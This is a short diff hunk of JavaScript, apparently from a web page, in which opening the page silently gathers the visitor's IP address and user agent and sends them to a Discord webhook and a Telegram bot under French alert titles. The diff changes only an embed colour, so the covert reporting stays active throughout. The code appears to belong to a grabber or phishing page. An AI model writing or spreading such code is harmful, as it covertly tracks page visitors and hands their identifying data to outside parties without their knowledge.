@@ -349,7 +349,7 @@
     const ip = await getIP();
     const ua = navigator.userAgent||"Inconnu";
     await Promise.all([
-      sendDiscord({title:"[👻] PAGE OUVERTE [👻]",color:0x9B00FF,fields:[{name:"🛜 IP",value:ip},{name:"📲 UA",value:ua}],timestamp:new Date().toISOString()}),
+      sendDiscord({title:"[👻] PAGE OUVERTE [👻]",color:0x000000,fields:[{name:"🛜 IP",value:ip},{name:"📲 UA",value:ua}],timestamp:new Date().toISOString()}),
       sendTelegram(`[🌐] PAGE OUVERTE [🌐]\n\n🌐 IP : ${ip}\n🌐 UA : ${ua}`)
     ]);
   });
